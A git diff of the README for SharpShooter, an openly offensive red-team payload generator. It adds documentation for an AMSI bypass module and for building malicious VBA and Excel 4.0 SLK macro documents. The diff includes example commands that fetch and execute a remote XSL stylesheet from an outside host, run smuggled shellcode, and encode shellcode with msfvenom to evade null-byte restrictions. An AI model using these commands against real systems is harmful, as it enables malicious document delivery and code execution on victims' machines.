@@ -24,6 +24,8 @@ SharpShooter targets v2, v3 and v4 of the .NET framework which will be found on 
 
 Version 1.0 of SharpShooter introduced several new concepts, including COM staging, execution of Squiblydoo and Squiblytwo, as well as XSL execution. To acomplish this new functionality, several new flags were added; --com, --awl and --awlurl.
 
+Version 2.0 of SharpShooter added the AMSI bypass module, along with support generating VBA and Excel 4 macro enabled documents.
+
 Further information can be found on the [MDSec blog post](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/).
 
 Usage - Command Line Mode:
@@ -126,6 +128,28 @@ SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile
 
 This example creates a HTA smuggled file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.
 
+### Creation of a VBA Macro ###
+
+```
+SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
+```
+
+This example creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.
+
+
+### Creation of an Excel 4.0 SLK Macro Enabled Document ###
+
+```
+SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee
+```
+
+This example creates an Excel 4.0 SLK file that executes the supplied shellcode and wraps it in HTML.
+The shellcode cannot contain null bytes, hint:
+
+```
+msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\x00'
+```
+
 Author and Credits
 ==================
 Author: Dominic Chell, MDSec ActiveBreach [@domchell](https://twitter.com/domchell) and [@mdseclabs](https://twitter.com/mdseclabs)
@@ -136,3 +160,4 @@ Credits:
 - [@buffaloverflow](https://twitter.com/buffaloverflow): Rich Warren for Demiguise
 - [@arvanaghi](https://twitter.com/arvanaghi) and [@ChrisTruncer](https://twitter.com/ChrisTruncer): Brandon Arvanaghi and Chris Truncer for CheckPlease
 - [@subTee](https://twitter.com/subtee): Documentation for Squiblydoo and Squiblytwo techniques
+- [@StanHacked](https://twitter.com/stanhacked): Excel 4.0 technique and code examples
